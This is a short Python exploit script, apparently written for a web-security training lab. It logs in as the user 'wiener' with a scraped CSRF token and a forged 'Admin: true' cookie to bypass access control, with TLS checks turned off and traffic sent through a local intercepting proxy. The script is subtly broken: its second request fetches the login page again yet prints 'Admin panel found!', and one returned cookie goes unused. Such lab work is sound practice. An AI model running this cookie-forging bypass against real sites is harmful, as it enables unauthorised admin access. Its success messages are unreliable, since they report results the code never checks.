import sys
import urllib3
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def get_csrf(s, url):
    path = '/login'
    r = s.get(url+path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input')['value']
    session_cookie = r.cookies.get_dict().get('session')
    return csrf,session_cookie


def exploit_access_control(s, url):
    path = '/login'
    csrf,weiener_cookie = get_csrf(s, url)
    cookie = {'Admin':'true'}

    data = {'csrf':csrf, 'username':'wiener','password':'peter'}
    r = s.post(url+path, data=data, cookies=cookie, verify=False, proxies=proxies)
    if r.status_code == 200:
        print("(+) Logged in as wiener! ")
    r1 = s.get(url+path, cookies=cookie, verify=False, proxies=proxies)
    if r1.status_code == 200:
        print("(+) Admin panel found!")

if __name__ =='__main__':
    try:
        url = sys.argv[1]   
    except IndexError:
        print("Usage: python %s <url>" %sys.argv[0])
        print("Example: python %s example.com" %sys.argv[0])
        sys.exit(1)
    s = requests.session()
    exploit_access_control(s, url)